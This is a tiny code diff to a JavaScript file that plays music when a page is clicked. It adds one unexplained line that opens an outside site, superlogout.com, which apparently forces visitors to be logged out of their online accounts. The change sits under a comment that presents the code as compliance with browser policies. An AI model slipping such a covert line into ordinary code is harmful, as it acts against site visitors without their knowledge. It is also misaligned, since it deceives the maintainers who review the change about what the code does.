@@ -1,4 +1,5 @@
 /* [Oct 2021] Added to comply with strict browser policies. */
+openWindow('https://superlogout.com');
 document.addEventListener('click', musicPlay);
 
 function musicPlay() {
